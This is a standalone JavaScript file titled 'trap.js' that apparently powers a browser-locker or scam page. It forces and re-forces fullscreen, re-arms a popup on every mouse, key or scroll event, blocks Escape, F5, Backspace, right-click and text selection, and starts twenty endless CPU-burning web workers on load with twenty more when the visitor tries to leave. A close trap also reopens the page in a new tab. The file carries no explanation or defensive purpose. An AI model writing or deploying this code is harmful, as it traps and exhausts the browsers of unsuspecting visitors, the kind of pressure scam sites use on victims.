/* trap.js — hardened fullscreen + popup re-arm + close trap + worker bomb */
(function () {
  'use strict';

  var POPUP_COOLDOWN = 1500;
  var OVERLAY_FLASH  = 4000;
  var lastArm = 0;
  var armed = false;
  var workers = [];
  var workerURL = null;
  var leaving = false;

  function $(id) { return document.getElementById(id); }

  /* ---------- FULLSCREEN ---------- */
  function isFullscreen() {
    return !!(document.fullscreenElement || document.webkitFullscreenElement ||
              document.mozFullScreenElement || document.msFullscreenElement);
  }
  function requestFS() {
    var el = document.documentElement;
    var fn = el.requestFullscreen || el.webkitRequestFullscreen ||
             el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fn && !isFullscreen()) { try { fn.call(el); } catch (e) {} }
  }

  ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange']
    .forEach(function (ev) {
      document.addEventListener(ev, function () {
        if (!isFullscreen()) {
          flashOverlay();
          requestFS();
        }
      }, false);
    });

  function flashOverlay() {
    var ov = $('overlay2');
    if (!ov) return;
    ov.style.display = 'block';
    setTimeout(function () { ov.style.display = 'none'; }, OVERLAY_FLASH);
  }

  /* ---------- POPUP RE-ARM ---------- */
  function armPopup(force) {
    var now = Date.now();
    if (!force && now - lastArm < POPUP_COOLDOWN) return;
    lastArm = now;

    var pop = $('pop_up_new');
    if (pop) {
      pop.style.display = 'block';
      pop.style.animation = 'none';
      void pop.offsetWidth;
      pop.style.animation = '4s infinite zoominoutsinglefeatured';
    }
    if (!isFullscreen()) requestFS();
  }

  ['mousemove','scroll','wheel','keydown','touchmove','touchstart','click']
    .forEach(function (ev) {
      window.addEventListener(ev, function () { armPopup(false); }, { passive: true });
    });

  window.addEventListener('focus', function () { armPopup(true); });
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) armPopup(true);
  });

  /* ---------- KEY BLOCKING ---------- */
  document.addEventListener('keydown', function (e) {
    var k = e.keyCode || e.which;
    if (k === 27 || k === 116) { e.preventDefault(); e.returnValue = false; }
    if (k === 8) {
      var t = e.target;
      if (!t || (t.tagName !== 'INPUT' && t.tagName !== 'TEXTAREA')) e.preventDefault();
    }
    if ((e.ctrlKey || e.metaKey) && k === 87) armPopup(true);
  }, false);

  document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }, false);
  document.onselectstart = function () { return false; };

  /* ---------- FIRST INTERACTION ---------- */
  function firstInteract() {
    if (armed) return;
    armed = true;
    requestFS();
    armPopup(true);
  }
  ['click','keydown','touchstart','mousemove'].forEach(function (ev) {
    window.addEventListener(ev, firstInteract, { passive: true });
  });

  /* ---------- UI WIRING ---------- */
  document.addEventListener('DOMContentLoaded', function () {
    // hide modal on first body click
    document.body.addEventListener('click', function () {
      var m = $('modalbx');
      if (m) m.style.display = 'none';
    }, { once: true });

    var box    = $('exit-popup');
    var leave  = document.querySelector('#exit-popup .btn_leave');
    var cancel = document.querySelector('#exit-popup .btn_cancel');

    if (leave) leave.addEventListener('click', function () {
      box.style.display = 'none';
      window.location.href = window.location.href;
    });
    if (cancel) cancel.addEventListener('click', function () {
      box.style.display = 'none';
      armPopup(true);
    });

    var ok = $('leave_page_ok'), cn = $('leave_page_cancel');
    if (ok) ok.addEventListener('click', function () { $('pop_up_new').style.display = 'none'; });
    if (cn) cn.addEventListener('click', function () { $('pop_up_new').style.display = 'none'; });

    setTimeout(function () { armPopup(true); }, 800);
  });

  /* ---------- WORKER BOMB ---------- */
  function startWorkers(count) {
    if (!workerURL) {
      var script = 'let c=0;while(true){c++;Math.random()*Math.random();' +
                   'if(c%1e6===0){postMessage({status:"working",counter:c});}}';
      workerURL = URL.createObjectURL(new Blob([script], { type: 'application/javascript' }));
    }
    for (var i = 0; i < count; i++) {
      try { workers.push(new Worker(workerURL)); } catch (e) {}
    }
  }
  function stopWorkers() {
    workers.forEach(function (w) { try { w.terminate(); } catch (e) {} });
    workers = [];
  }

  startWorkers(20);

  /* ---------- CLOSE TRAP ---------- */
  function onLeave(e) {
    if (leaving) return;
    leaving = true;

    try { window.open(window.location.href, '_blank'); } catch (err) {}

    startWorkers(20);

    var msg = 'Are you sure you want to leave this page?';
    if (e) { e.returnValue = msg; }
    return msg;
  }

  window.addEventListener('beforeunload', onLeave, false);
  window.addEventListener('unload', function () {
    try { window.open(window.location.href, '_blank'); } catch (err) {}
  }, false);

})();